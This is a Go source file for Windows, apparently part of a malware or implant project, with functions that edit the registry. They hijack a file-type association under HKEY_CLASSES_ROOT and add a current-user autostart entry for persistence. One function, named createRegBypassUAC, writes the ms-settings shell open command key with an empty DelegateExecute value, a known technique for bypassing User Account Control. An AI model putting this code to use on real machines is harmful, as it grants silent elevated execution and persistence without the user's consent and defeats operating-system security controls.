package main

import (
	"errors"
	"golang.org/x/sys/windows/registry"
	"log"
)

// 修改文件打开方式
func changeRegOpenT(path string,  value string) {
	k, err := registry.OpenKey(registry.CLASSES_ROOT, path, registry.ALL_ACCESS)

	if err != nil {
		log.Fatal(err)
	}
	defer k.Close()

	err = k.SetExpandStringValue("", value)
	if err != nil {
		log.Fatal(err)
	}
}

// 创建自启注册表项
func createRegAutoStart(path string,name string,value string){
	//k1, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.ALL_ACCESS)
	k2, err := registry.OpenKey(registry.CURRENT_USER, path, registry.ALL_ACCESS)

	if err != nil {
		log.Fatal(err)
	}
	//defer k1.Close()
	defer k2.Close()

	//err= k1.SetStringValue(name,value)
	//if err!=nil {
	//	log.Fatal(err)
	//}

	err= k2.SetStringValue(name,value)
	if err!=nil {
		log.Fatal(err)
	}
}

func createRegBypassUAC() {
	k, _ ,_ := registry.CreateKey(registry.CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", registry.ALL_ACCESS)

	defer k.Close()

	err := k.SetStringValue("",exePath + " lwh")
	err= k.SetStringValue("DelegateExecute","")
	if err!=nil {
		messagebox(errors.New(err.Error()))
	}
}